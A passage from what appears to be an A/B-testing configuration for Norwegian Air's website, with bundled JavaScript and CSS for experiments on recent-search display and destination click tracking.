                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 1);
                        }([function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function waitUntil(predicate) {
                            var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                            return new Promise(function (resolve) {
                              var int = setInterval(function () {
                                predicate() && (resolve(predicate()), clearInterval(int), int = null);
                              }, 500);
                              setTimeout(function () {
                                null !== int && (clearInterval(int), console.log("condition false"));
                              }, time);
                            });
                          }
                          __webpack_require__.d(__webpack_exports__, "a", function () {
                            return waitUntil;
                          });
                        }, function (module, exports, __webpack_require__) {
                          __webpack_require__(5), module.exports = __webpack_require__(6);
                        },,,, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          __webpack_require__.r(__webpack_exports__);
                          var utilitiesSeparate = __webpack_require__(0);
                          function norT132_storeAirportCities() {
                            var airportCode,
                              matchingData,
                              norT132_abandonedFromCityCodes = document.querySelector(".abandoned-basket__airport.norT132_fromAirportDestination .abandoned-basket__code").textContent.trim(),
                              norT132_abandonedToCityCodes = document.querySelector(".abandoned-basket__airport.norT132_toAirportDestination .abandoned-basket__code").textContent.trim(),
                              norT132_abandonedDepartDate = document.querySelector(".abandoned-basket__airport.norT132_fromAirportDestination .abandoned-basket__date").textContent.trim(),
                              norT132_abandonedArivalDate = document.querySelector(".abandoned-basket__airport.norT132_toAirportDestination .abandoned-basket__date").textContent.trim(),
                              norT132_FinalDestinationName = document.querySelector(".abandoned-basket__illustration .abandoned-basket__city").textContent.trim();
                            document.querySelector(".nas-flight-search__airport-select").insertAdjacentHTML("afterend", function (norT132_FinalDestinationName, norT132_abandonedFromCityCodes, norT132_abandonedToCityCodes, norT132_abandonedDepartDate, norT132_abandonedArivalDate) {
                              var host = window.location.hostname.replace("www.norwegian.", "");
                              return "no" !== host && (host = window.location.pathname.split("/")[1]), function (nor_T132_LastFlighTranslations, host, norT132_FinalDestinationName, norT132_abandonedFromCityCodes, norT132_abandonedToCityCodes, norT132_abandonedDepartDate, norT132_abandonedArivalDate) {
                                return '<div class="nor_T132_abandonedBasket_Wrapper">\n        <div class="nor_T132_abandonedBasket_lastSearch">\n            <p class="norT132_abandonedBasket_lastSearchText">'.concat(nor_T132_LastFlighTranslations[host].lastFlight, ':</p>\n        </div>\n        <div class="nor_T132_abandonedBasket__illustration">\n            <div class="nor_T132_abandonedBasket__Image">\n                <img src="https://www.norwegian.no/globalassets/ip/media/destinations/aalborg/2022/aal--waterfront-rendsburggade.jpg"\n                    alt="T132_AbandonedBasket_CountryImage">\n            </div>\n    \n            <div class="nor_T132_abandonedBasket__AirportsWrapper">\n                <div class="nor_T132_abandonedBasket__City">').concat(norT132_FinalDestinationName, '</div>\n                <div class="nor_T132_abandonedBasket__AirportCodeWrapper">\n                    <div class="nor_T132_abandonedBasket__FromAirportCode nor_T132_abandonedBasket__CommonAirportCodes">\n                        <p><span class="norT132_customAirportCodes">').concat(norT132_abandonedFromCityCodes, '</span> <span class="nor_T132_abandonedBasket__date">').concat(norT132_abandonedDepartDate, '</span></p>\n                    </div>\n                    <img src="data:image/svg+xml,%3C%3Fxml version%3D%221.0%22 encoding%3D%22utf-8%22%3F%3E%3C!-- Generator%3A Adobe Illustrator 18.1.0%2C SVG Export Plug-In . SVG Version%3A 6.00 Build 0)  --%3E%3C!DOCTYPE svg PUBLIC %22-%2F%2FW3C%2F%2FDTD SVG 1.1%2F%2FEN%22 %22http%3A%2F%2Fwww.w3.org%2FGraphics%2FSVG%2F1.1%2FDTD%2Fsvg11.dtd%22%3E%3Csvg version%3D%221.1%22 id%3D%22Layer_1%22 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22 x%3D%220px%22 y%3D%220px%22%09 width%3D%2248px%22 height%3D%2248px%22 viewBox%3D%22-273 396.9 48 48%22 enable-background%3D%22new -273 396.9 48 48%22 xml%3Aspace%3D%22preserve%22%3E%3Cg%3E%09%3Cpath fill%3D%22%23003D50%22 d%3D%22M-241.1%2C419.9h-17.6c-2.2-2.6-5.8-7.1-6.4-7.8c-0.8-1-1.8-1.4-1.8-1.4h-3l2%2C9.2h-5v1.3l15.4%2C5.6l3.7%2C0.1%09%09c-0.6%2C0.4-0.8%2C0.9-0.9%2C1.4c0%2C1.6%2C3.1%2C2.8%2C6.9%2C2.8c3.8%2C0%2C4.4-1.3%2C4.4-2.9c0%2C0%2C0%2C0%2C0-0.1l0%2C0l-0.1-1.2h2.3L-241.1%2C419.9z%22%2F%3E%09%3Cpath fill%3D%22%23003D50%22 d%3D%22M-225.2%2C424.3c0-1.6-6.3-4.3-11.2-4.4l-3.1-0.1v7h6.1C-229.4%2C426.9-225.2%2C425.2-225.2%2C424.3z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E"\n                        alt="norT132_FlightDestinationImage">\n                    <div class="nor_T132_abandonedBasket__ToAirportCode nor_T132_abandonedBasket__CommonAirportCodes">\n                        <p><span class="norT132_customAirportCodes">').concat(norT132_abandonedToCityCodes, '</span> <span class="nor_T132_abandonedBasket__date">').concat(norT132_abandonedArivalDate, '</span></p>\n                    </div><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="-273 396.9 48 48"\n                        id="medium--arrow-right" y="528">\n                        <g fill="#003D50">\n                            <path d="M-267.1 417.9h31.5v6h-31.5z"></path>\n                            <path\n                                d="M-232.4 418l-14.5-15.1h-8.5l17.8 18-17.6 18h8.5l14.5-15.1c.8-.8 1.2-1.8 1.3-2.9-.3-1.1-.7-2.1-1.5-2.9z">\n                            </path>\n                        </g>\n                    </svg>\n    \n                </div>\n            </div>\n        </div>\n    </div>');
                              }({
                                se: {
                                  lastFlight: "Senaste sökningar"
                                },
                                dk: {
                                  lastFlight: "Seneste søgninger"
                                },
                                no: {
                                  lastFlight: "Siste søk"
                                }
                              }, host, norT132_FinalDestinationName, norT132_abandonedFromCityCodes, norT132_abandonedToCityCodes, norT132_abandonedDepartDate, norT132_abandonedArivalDate);
                            }(norT132_FinalDestinationName, norT132_abandonedFromCityCodes, norT132_abandonedToCityCodes, norT132_abandonedDepartDate, norT132_abandonedArivalDate)), document.querySelector(".nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__Image img").setAttribute("src", (airportCode = document.querySelector(".nor_T132_abandonedBasket__ToAirportCode .norT132_customAirportCodes").textContent, (matchingData = [{
                              airportCode: "SJJ",
                              airportImage: "SJJ--old-town--2x.jpg"
                            }, {
                              airportCode: "ZAG",
                              airportImage: "ZAG--Cafes-on-street-old-town--2x.jpg"
                            }, {
                              airportCode: "VRN",
                              airportImage: "VRN--piazza--2x.jpg"
                            }, {
                              airportCode: "VNO",
                              airportImage: "VNO--city-tower-river--2x.jpg"
                            }, {
                              airportCode: "WRO",
                              airportImage: "WRO--canal-boats-buildings--2x.jpg"
                            }, {
                              airportCode: "VIE",
                              airportImage: "VIE--promenade-river--2x.jpg"
                            }, {
                              airportCode: "VCE",
                              airportImage: "VCE--gondolier-paddles--2x.jpg"
                            }, {
                              airportCode: "VAR",
                              airportImage: "VAR--rock-monastery--2x.jpg"
                            }, {
                              airportCode: "TLL",
                              airportImage: "TLL--famous-street--2x.jpg"
                            }, {
                              airportCode: "TIV",
                              airportImage: "TIV--kamenovo-beach--2x.jpg"
                            }, {
                              airportCode: "TIA",
                              airportImage: "TIA--market--2x.jpg"
                            }, {
                              airportCode: "SZG",
                              airportImage: "SZG--ski-resorts--2x.jpg"
                            }, {
                              airportCode: "SZZ",
                              airportImage: "SZZ--sharps-brave--2x.jpg"
                            }, {
                              airportCode: "TFS",
                              airportImage: "TFS--coastal-village--2x.jpg"
                            }, {
                              airportCode: "SPU",
                              airportImage: "SPU--view-summer--2x.jpg"
                            }, {
                              airportCode: "SOF",
                              airportImage: "SOF--sofia-cathedral--2x.jpg"
                            }, {
                              airportCode: "SKG",
                              airportImage: "SKG--church-of-st-george--2x.jpg"
                            }, {
                              airportCode: "SKP",
                              airportImage: "SKP--old-town--2x.jpg"
                            }, {
                              airportCode: "RVN",
                              airportImage: "RVN--winter-village--2x.jpg"
                            }, {
                              airportCode: "RNN",
                              airportImage: "RNN--fishing-boats-harbor--2x.jpg"
                            }, {
                              airportCode: "PVK",
                              airportImage: "PVK--harbour-and-colorful-houses--2x.jpg"
                            }, {
                              airportCode: "RAK",
                              airportImage: "RAK--marrakech-mosque--2x.jpg"
                            }, {
                              airportCode: "PUY",
                              airportImage: "PUY--roman-amphitheater--2x.jpg"
                            }, {
                              airportCode: "PRN",
                              airportImage: "PRN--city-view--2x.jpg"
                            }, {
                              airportCode: "PRG",
                              airportImage: "PRG--charles-bridge--2x.jpg"
                            }, {
                              airportCode: "PMO",
                              airportImage: "PMO--rock-of-cefalu--2x.jpg"
                            }, {
                              airportCode: "PLQ",
                              airportImage: "PLQ--river-channel--2x.jpg"
                            }, {
                              airportCode: "OTP",
                              airportImage: "OTP--public-park-river-downtown--2x--2x.jpg"
                            }, {
                              airportCode: "OLB",
                              airportImage: "OLB--harbor--2x.jpg"
                            }, {
                              airportCode: "OPO",
                              airportImage: "OPO--tram--2x.jpg"
                            }, {
                              airportCode: "MXP",
                              airportImage: "MXP--city-restaurant-cathedral--2x.jpg"
                            }, {
                              airportCode: "NAP",
                              airportImage: "NAP--coastline--2x.jpg"
                            }, {
                              airportCode: "MPL",
                              airportImage: "MPL--main-square--2x.jpg"
                            }, {
                              airportCode: "MLA",
                              airportImage: "MLA--natural-rock-formations--2x.jpg"
                            }, {
                              airportCode: "MAD",
                              airportImage: "MAD--calle-de-alcala-city-buldings-2x.jpg"
                            }, {
                              airportCode: "MAN",
                              airportImage: "MAN--albert-square-town-hall-2x.jpg"
                            }, {
                              airportCode: "LYS",
                              airportImage: "LYS--cathedral--2x.jpg"
                            }, {
                              airportCode: "LYR",
                              airportImage: "LYR--longyearbyen-city-mountain-view--2x.jpg"
                            }, {
                              airportCode: "LIS",
                              airportImage: "LIS--yellow-tram--2x.jpg"
                            }, {
                              airportCode: "LCA",
                              airportImage: "LCA--pier-marina--2x.jpg"
                            }, {
                              airportCode: "KTT",
                              airportImage: "KTT--northern-light--2x.jpg"
                            }, {
                              airportCode: "LCA",
                              airportImage: "LCA--calm-beach--2x.jpg"
                            }, {
                              airportCode: "KKN",
                              airportImage: "KKN--reindeer-skin-tent--2x.jpg"
                            }, {
                              airportCode: "KRS",
                              airportImage: "KRS--fish-wharf--2x.jpg"
                            }, {
                              airportCode: "KEF",
                              airportImage: "KEF--cityscape--2x.jpg"
                            }, {
                              airportCode: "JTR",
                              airportImage: "JTR--summer-sea--2x.jpg"
                            }, {
                              airportCode: "HAU",
                              airportImage: "HAU--waterfront--2x.jpg"
                            }, {
                              airportCode: "HAM",
                              airportImage: "HAM--magellan-terrassen--2x.jpg"
                            }, {
                              airportCode: "GZP",
                              airportImage: "GZP--coast-turkish-riviera--2x.jpg"
                            }, {
                              airportCode: "FNC",
                              airportImage: "FNC--view-sea--2x.jpg"
                            }, {
                              airportCode: "GVA",
                              airportImage: "GVA--aerial-view--2x.jpg"
                            }, {
                              airportCode: "EFL",
                              airportImage: "EFL--view-sea-and-mountains--2x.jpg"
                            }, {
                              airportCode: "EDI",
                              airportImage: "EDI--city-street--2x.jpg"
                            }, {
                              airportCode: "DUS",
                              airportImage: "DUS--rhine-river--2x.jpg"
                            }, {
                              airportCode: "DUB",
                              airportImage: "DUB--temple-bar-area--2x.jpg"
                            }, {
                              airportCode: "CTA",
                              airportImage: "CTA--teatro-bellini--2x.jpg"
                            }, {
                              airportCode: "DBV",
                              airportImage: "DBV--old-town-skyline--2x.jpg"
                            }, {
                              airportCode: "BRI",
                              airportImage: "BRI--port-colorful-fisherboats--2x.jpg"
                            }, {
                              airportCode: "BOO",
                              airportImage: "BOO--fishing-boats--2x.jpg"
                            }, {
                              airportCode: "BOJ",
                              airportImage: "BOJ--ruins-medieval-fort-walls--2x.jpg"
                            }, {
                              airportCode: "BLQ",
                              airportImage: "BLQ--city--2x.jpg"
                            }, {
                              airportCode: "BOD",
                              airportImage: "BOD--opera-national--2x.jpg"
                            }, {
                              airportCode: "BIO",
                              airportImage: "BIO--walkway-to-island--2x.jpg"
                            }, {
                              airportCode: "BIA",
                              airportImage: "BIA--beach-pine-trees-sea--2x.jpg"
                            }, {
                              airportCode: "BGY",
                              airportImage: "BGY--venetian-wall--2x.jpg"
                            }, {
                              airportCode: "BER",
                              airportImage: "BER--tour-boat-bode-museum--2x.jpg"
                            }, {
                              airportCode: "AYT",
                              airportImage: "AYT--port-sightseeing-boats--2x.jpg"
                            }, {
                              airportCode: "ATH",
                              airportImage: "ATH--acropolis--2x.jpg"
                            }, {
                              airportCode: "ALC",
                              airportImage: "ALC--marbella-beach--2x.jpg"
                            }, {
                              airportCode: "ANX",
                              airportImage: "ANX--fishing-village--2x.jpg"
                            }, {
                              airportCode: "AJA",
                              airportImage: "AJA--fort-in-corsica--2x.jpg"
                            }, {
                              airportCode: "ACE",
                              airportImage: "ACE--papagayo-beach--2x.jpg"
                            }, {
                              airportCode: "AAL",
                              airportImage: "AAL--pedestrian-street--2x.jpg"
                            }, {
                              airportCode: "AGP",
                              airportImage: "AGP-spain-malaga-1920x620.jpg"
                            }, {
                              airportCode: "ARN",
                              airportImage: "ARN-sweden-stockholm-1920x620.jpg"
                            }, {
                              airportCode: "BCN",
                              airportImage: "BCN-barcelona-headerbanner-1920x630.jpg"
                            }, {
                              airportCode: "BEG",
                              airportImage: "BEG-serbia-belgrade-178588719-1920x620.jpg"
                            }, {
                              airportCode: "BLL",
                              airportImage: "BLL-billund-lego-land-1930x630.jpg"
                            }, {
                              airportCode: "BUD",
                              airportImage: "BUD-hungary-budapest-537333836-1920x620.jpg"
                            }, {
                              airportCode: "CFU",
                              airportImage: "CFU-greece-corfu-927050344-1920x620.jpg"
                            }, {
                              airportCode: "CGD",
                              airportImage: "CGD-parall-france-paris-1920x620.jpg"
                            }, {
                              airportCode: "CHQ",
                              airportImage: "CHQ-greece-crete-chania-947952062-1920x620.jpg"
                            }, {
                              airportCode: "CPH",
                              airportImage: "CPH-denmark-copenhagen-642182416-1920x620.jpg"
                            }, {
                              airportCode: "FCO",
                              airportImage: "FCO-italy-rome-1920x620.jpg"
                            }, {
                              airportCode: "GDN",
                              airportImage: "GDN-poland-gdansk-998570772-1920x620.jpg"
                            }, {
                              airportCode: "GOT",
                              airportImage: "GOT-sweden-gothenburg-537551173-1920x620.jpg"
                            }, {
                              airportCode: "HEL",
                              airportImage: "HEL-finland-helsinki-1920x620.jpg"
                            }, {
                              airportCode: "HER",
                              airportImage: "HER-greece-crete-heraklion-841928296-1920x620.jpg"
                            }, {
                              airportCode: "KRK",
                              airportImage: "KRK-poland-krakow-1920x620.jpg"
                            }, {
                              airportCode: "KRN",
                              airportImage: "KRN-sweden-kiruna-1920x620.jpg"
                            }, {
                              airportCode: "LGW",
                              airportImage: "LGW-uk-london-1920x620.jpg"
                            }, {
                              airportCode: "LLA",
                              airportImage: "LLA-sweden-lulea-917000686-1920x620.jpg"
                            }, {
                              airportCode: "LPA",
                              airportImage: "LPA-spain-gran-canaria-1920x620.jpg"
                            }, {
                              airportCode: "MOL",
                              airportImage: "MOL-mde-norway-molde-862049080-1920x620.jpg"
                            }, {
                              airportCode: "NCE",
                              airportImage: "NCE-france-nice-1920x620.jpg"
                            }, {
                              airportCode: "PSA",
                              airportImage: "PSA-italy-pisa-898424872-1920x620.jpg"
                            }, {
                              airportCode: "RHO",
                              airportImage: "RHO-greece-rhodes-600394478-1920x620.jpg"
                            }, {
                              airportCode: "RIX",
                              airportImage: "RIX-latvia-riga-843653510-1920x620.jpg"
                            }, {
                              airportCode: "TLV",
                              airportImage: "TLV-israel-tel-aviv-1920x620.jpg"
                            }, {
                              airportCode: "VBY",
                              airportImage: "VBY-sweden-visby-174286488-1920x620.jpg"
                            }, {
                              airportCode: "WAW",
                              airportImage: "WAW-warsaw-city-center-old-town-1700x350.jpg"
                            }, {
                              airportCode: "AES",
                              airportImage: "AES-aalesund-norway-city-view-1920x620-Large.jpg"
                            }, {
                              airportCode: "ALF",
                              airportImage: "ALF-alta-norway-mountain-lake-1920x620-Large.jpg"
                            }, {
                              airportCode: "BGO",
                              airportImage: "BGO-bergen-norway-harbour-1920x620-Large.jpg"
                            }, {
                              airportCode: "BOD",
                              airportImage: "BOD-narvik-norway-fjord-kajak-1920x620-Large.jpg"
                            }, {
                              airportCode: "BOO",
                              airportImage: "BOO-bodo_headerbanner_1920x640-Large.jpg"
                            }, {
                              airportCode: "EVE",
                              airportImage: "EVE-narvik-norway-fjord-kajak-1920x620-Large.jpg"
                            }, {
                              airportCode: "MUC",
                              airportImage: "MUC-germany-munich-921988440-1920x620-Large.jpg"
                            }, {
                              airportCode: "OSL",
                              airportImage: "OSL-oslo-opera-harbour-norway-1920x620-Large.jpg"
                            }, {
                              airportCode: "OSLALL",
                              airportImage: "OSL-oslo-opera-harbour-norway-1920x620-Large.jpg"
                            }, {
                              airportCode: "PMI",
                              airportImage: "PMI-mallorca_headerbanner_1920x640-Large.jpg"
                            }, {
                              airportCode: "SVG",
                              airportImage: "SVG-stavanger_headerbanner_1920x640-Large.jpg"
                            }, {
                              airportCode: "TRD",
                              airportImage: "TRD-trondheim-harbour-norway-1920x620-Large.jpg"
                            }, {
                              airportCode: "FAO",
                              airportImage: "fao-portugal-algarve-faro-400x209.jpg"
                            }, {
                              airportCode: "AMS",
                              airportImage: "ams-amsterdam-canal-boats-400x209.jpg"
                            }, {
                              airportCode: "IBZ",
                              airportImage: "ibz-Ibiza_headerbanner_400x209.jpg"
                            }, {
                              airportCode: "CDG",
                              airportImage: "cdg-france-paris-eiffeltower-400x209.jpg"
                            }, {
                              airportCode: "TOS",
                              airportImage: "tos-tromso-headerbanner-400x209.jpg"
                            }, {
                              airportCode: "UME",
                              airportImage: "ume-umea-400x209.jpg"
                            }].filter(function (ele) {
                              return ele.airportCode === airportCode;
                            })).length > 0 ? "https://www.norwegian.com/globalassets/ip/media/02_media/brand/400x209/".concat(matchingData[0].airportImage) : "https://www.norwegian.com/globalassets/ip/media/02_media/brand/400x209/XXX--plane-inn-sky-default.jpg"));
                          }
                          !function () {
                            function nor_T132_init() {
                              var norT132_abandonedBaskerAirports;
                              console.log("********* T132 / Homepage / Abandonned basket in search box / SE, NO, DK ||  VARIATION ******"), document.querySelector("body").classList.add("nor_T132_AbandonedBasket__Search"), (norT132_abandonedBaskerAirports = document.querySelectorAll(".abandoned-basket__airport")).length >= 2 && (norT132_abandonedBaskerAirports[1].classList.add("norT132_toAirportDestination"), norT132_abandonedBaskerAirports[0].classList.add("norT132_fromAirportDestination")), norT132_storeAirportCities(), document.querySelector(".nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__illustration").addEventListener("click", function () {
                                document.querySelector(".abandoned-basket .abandoned-basket__item").click();
                              });
                            }
                            !function () {
                              var observer,
                                listeners = [],
                                doc = window.document,
                                MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                              function check() {
                                for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                                  listener = listeners[i];
                                  for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).variationReady || (element.variationReady = []), element.variationReady[i] || (element.variationReady[i] = !0, listener.fn.call(element, element));
                                }
                              }
                              window.optiReadyVariation = function (selector, fn) {
                                listeners.push({
                                  selector: selector,
                                  fn: fn
                                }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                                  childList: !0,
                                  subtree: !0
                                }), check();
                              };
                            }(), window.optiReadyVariation(".nas-search-box .nas-tab-group form.nas-flight-search", function () {
                              console.log("** Variation CODE ACTIVATED || Optiready **"), Object(utilitiesSeparate.a)(function () {
                                return null !== document.querySelector(".abandoned-basket a.abandoned-basket__item") && null !== document.querySelector(".abandoned-basket__airport") && null !== document.querySelector(".abandoned-basket__airport .abandoned-basket__code") && null !== document.querySelector(".abandoned-basket__airport .abandoned-basket__date") && null !== document.querySelector(".abandoned-basket__illustration .abandoned-basket__city") && null !== document.querySelector(".nas-flight-search__airport-select");
                              }).then(function () {
                                nor_T132_init();
                              });
                            });
                          }();
                        }, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "ff733df54a754eeab2efa6dcb438a53d",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>body.nor_T132_AbandonedBasket__Search .abandoned-basket {\n\tdisplay: none;\n}\n\nbody.nor_T132_AbandonedBasket__Search .content-area {\n\tmargin-top: 124px;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper {\n\tdisplay: flex;\n\twidth: 100%;\n\tmargin-top: 20px;\n\talign-items: center;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket_lastSearch {\n\tmargin-right: 15px;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket_lastSearch .norT132_abandonedBasket_lastSearchText {\n\tfont-family: apercu, helvetica neue, Helvetica, Arial, sans-serif;\n\tfont-size: 14px;\n\tfont-style: normal;\n\tfont-weight: 400;\n\tline-height: 18px;\n\tcolor: #003251;\n\tmargin-bottom: 0;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__Image img {\n\tborder-radius: 50%;\n\twidth: 55px;\n\theight: 54.2px;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__illustration {\n\tdisplay: flex;\n\talign-items: center;\n\tcursor: pointer;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__Image {\n\tmargin-right: 10px;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__AirportsWrapper svg {\n\twidth: 16px;\n\theight: 16px;\n\tmargin: 0 8px;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__AirportCodeWrapper {\n\tdisplay: flex;\n\twidth: 100%;\n\talign-items: center;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__City {\n\tfont-size: 16px;\n\tfont-style: normal;\n\tfont-weight: 700;\n\tline-height: 24px;\n\tcolor: #003251;\n\tfont-family: apercu, helvetica neue, Helvetica, Arial, sans-serif;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__AirportCodeWrapper img {\n\twidth: 18px;\n\theight: 18px;\n\tmargin: 0 8px;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__CommonAirportCodes p {\n\tfont-size: 12px;\n\tfont-style: normal;\n\tfont-weight: 700;\n\tline-height: 21px;\n\tcolor: #003251;\n\tfont-family: \"Apercu\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n\tmargin-bottom: 0;\n}\n\nbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__CommonAirportCodes .nor_T132_abandonedBasket__date {\n\tfont-weight: 400;\n}\n\n@media only screen and (max-width: 390px) {\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket_lastSearch {\n\t\tmargin-right: 6px;\n\t}\n\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__AirportCodeWrapper img,\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__AirportsWrapper svg {\n\t\tmargin: 0 3px;\n\t}\n\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__CommonAirportCodes p {\n\t\tfont-size: 11px;\n\t}\n\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__Image img {\n\t\twidth: 45px;\n\t\theight: 45.2px;\n\t}\n  \tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket_lastSearch .norT132_abandonedBasket_lastSearchText {\n\t\tfont-size: 12px;\n\t}\n\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__City {\n\t\tfont-size: 14px;\n\t}\n\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__CommonAirportCodes p {\n\t\tfont-size: 10px;\n\t}\n}\n\n@media only screen and (max-width: 340px) {\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__Image {\n\t\tmargin-right: 6px;\n\t}\n\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket_lastSearch .norT132_abandonedBasket_lastSearchText {\n\t\tfont-size: 12px;\n\t}\n\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__City {\n\t\tfont-size: 14px;\n\t}\n\n\tbody.nor_T132_AbandonedBasket__Search .nor_T132_abandonedBasket_Wrapper .nor_T132_abandonedBasket__CommonAirportCodes p {\n\t\tfont-size: 10px;\n\t}\n}</style>",
                      "dependencies": []
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "24793031970",
                  "endOfRange": 5000
                }, {
                  "entityId": "24797291436",
                  "endOfRange": 10000
                }],
                "name": "[LIVE] T132 / Homepage / Abandonned basket in search box / SE, NO, DK || Mobile",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["24793031969"],
              "weightDistributions": null,
              "decisionMetadata": null
            }, {
              "changes": [{
                "id": "2C01A1BA-2753-47F4-A4C7-EB717203B363",
                "type": "custom_code",
                "value": function ($) {
                  !function (modules) {
                    var installedModules = {};
                    function __webpack_require__(moduleId) {
                      if (installedModules[moduleId]) return installedModules[moduleId].exports;
                      var module = installedModules[moduleId] = {
                        i: moduleId,
                        l: !1,
                        exports: {}
                      };
                      return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                    }
                    __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                      __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                        enumerable: !0,
                        get: getter
                      });
                    }, __webpack_require__.r = function (exports) {
                      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                        value: "Module"
                      }), Object.defineProperty(exports, "__esModule", {
                        value: !0
                      });
                    }, __webpack_require__.t = function (value, mode) {
                      if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                      if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                      var ns = Object.create(null);
                      if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                        enumerable: !0,
                        value: value
                      }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                        return value[key];
                      }.bind(null, key));
                      return ns;
                    }, __webpack_require__.n = function (module) {
                      var getter = module && module.__esModule ? function () {
                        return module.default;
                      } : function () {
                        return module;
                      };
                      return __webpack_require__.d(getter, "a", getter), getter;
                    }, __webpack_require__.o = function (object, property) {
                      return Object.prototype.hasOwnProperty.call(object, property);
                    }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 2);
                  }([function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    function waitUntil(predicate) {
                      var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                      return new Promise(function (resolve) {
                        var int = setInterval(function () {
                          predicate() && (resolve(predicate()), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("condition false"));
                        }, time);
                      });
                    }
                    __webpack_require__.d(__webpack_exports__, "a", function () {
                      return waitUntil;
                    });
                  },, function (module, exports, __webpack_require__) {
                    module.exports = __webpack_require__(3);
                  }, function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    __webpack_require__.r(__webpack_exports__);
                    var _assets_utilitiesSeparate__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(0),
                      tracker = __webpack_require__(4);
                    !function () {
                      var selectorMatches = function (el, selector) {
                          var p = Element.prototype,
                            f = p.matches || p.webkitMatchesSelector || p.mozMatchesSelector || p.msMatchesSelector;
                          return void 0 === f && (f = -1 !== [].indexOf.call(document.querySelectorAll(selector), this)), f.call(el, selector);
                        },
                        bindClickDom = function (selector, handler) {
                          document.addEventListener("click", function (e) {
                            for (var doc = window.document, target = e.target; target && target !== doc; target = target.parentNode) if (selectorMatches(target, selector)) {
                              handler.call(target, e);
                              break;
                            }
                          }, !1);
                        };
                      function norT136_SharedInit() {
                        console.log("********* T136 / Destinations / Filters on side / SE, NO, DK || SHARED CODE*****"), bindClickDom(".nas-destination-list__item", function () {
                          tracker.push_API_only("Clicks_on_a_Destination_box");
